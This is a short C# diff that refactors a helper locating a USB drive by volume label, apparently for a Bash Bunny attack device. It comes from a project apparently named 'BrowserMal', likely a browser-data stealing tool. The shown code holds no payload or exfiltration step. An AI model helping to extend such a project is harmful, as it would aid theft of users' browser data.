@@ -1,4 +1,5 @@
 ﻿using System.IO;
+using System.Linq;
 
 namespace BrowserMal.Util
 {
@@ -8,16 +9,11 @@ namespace BrowserMal.Util
 
         public static string FindBashBunny()
         {
-            var driveList = DriveInfo.GetDrives();
-
-            foreach (DriveInfo drive in driveList)
+            try
             {
-                if (drive.DriveType == DriveType.Removable)
-                {
-                    if (drive.VolumeLabel == DRIVE_LABEL)
-                        return drive.RootDirectory.FullName;
-                }
+                return DriveInfo.GetDrives().Where(x => x.VolumeLabel == DRIVE_LABEL).FirstOrDefault()?.RootDirectory.FullName;
             }
+            catch { }
 
             return string.Empty;
         }
